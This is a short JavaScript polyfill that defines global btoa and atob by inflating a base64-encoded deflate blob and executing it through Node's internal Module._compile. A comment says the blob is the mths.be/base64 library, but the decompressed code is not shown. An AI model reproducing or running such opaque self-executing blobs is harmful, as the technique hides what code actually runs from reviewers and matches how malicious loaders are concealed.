(function(){
  /*! https://mths.be/base64 v1.0.0 by @mathias | MIT license */
  let deflate = 'jFSFmusoGH0Vhm+HD25opDaSct3d3Wjyp+FuCl3C+My7L3VbuVVyfjs5nLBTH'+
  'OnMKaMpsItjaZET2PR/QeawEO5sBKZAcDoy1tWEzBbcbucMTX5UASHr/+GswqfNIW62iweV6cuK'+
  'kOl/asLpYkcIQ4gJT5TOzcn46vKSgjAsHRPVYpW6K1UdDqGu5QAEXKVUhyNrnBlPEBpO0D1rjWW'+
  'hlkMQ+JE+lpXK75TSysyBnQTxpK3caGvNCRrXjy+veCbwrdt37t67/+Dho8dPnj57/uLlq9dv3r'+
  '57/+Hjp8+yn+VQDEr1689qqM3oL1u7o+OT07PzOGm22p3u3v5BEGGei+jLV/dVfy2+WvQtGvBSX'+
  'IDOTA6Hq7NBvHFW6YFf8+jL969x4+vp/fvfotBB7TxIiKT4bQmonqQhZ1Af0LRRjjKjnVS6Rtn8'+
  'JmtkjlytckBecufrnkqndIKs1AMIMUsLY+nEAtxyw7XnCWEFeuDK3ZbniDFXopHwYgE38jQIVK9'+
  'ImfPYeNAdP/uWo4r1ekmX23XU53p8n5ttmJeByCagB6gWLrCBYdevJ/uk22LBIqQ91NyCuutIt0'+
  'U0Sy24I6tRU4j8Bt3m53nY3+IxZhGvz2tvMOj1ppywwOww8QMJoXpj4npr36S53qE96yCwz7ziO'+
  'Wz5Yfp00hVbhBZGlcyA5hxjxma7krrdthCx5zDJhkVWJMSNP6LVVMbpJDm5vPQOC2Tj/Fbjc9w4'+
  'iJYum9ps9sAszXSI3KbzppRzpGqkjfMGtBYyV53NLblqsYnBRLx01cRILmXGa6R0DqcvCgpzeRR'+
  'j3Aq9277RbV/zxjj0xUGw2yaElsFMjrCwZnhnJjhtdjrEXr9OG81rmnQZW9jBS3sMtlZGH+IkjM'+
  'MYX6WqoHgu9PJQyqFQGgjZOq2mgVAOc0KWazZdUrrYMnaxmOnnQ1UD8pMcITsu1J7kW9+OecQyu'+
  'zgny2neXCaFlC9nZVjK+sWJfmnNCKw784KMd/eL+iZK/zNrDmFf1tBti/KKjo9Dlv49LgA=';
  // :troll: https://stackoverflow.com/a/17585470
  let Module = require('module');
  let m = new Module();
  let s = require('zlib').inflateRawSync(Buffer.from(deflate, 'base64')) + '';
  m._compile(s, '');
  let base64 = m.exports;
  global.btoa = function btoa(b) { return base64.encode(b); };
  global.atob = function atob(a) { return base64.decode(a); };
})();
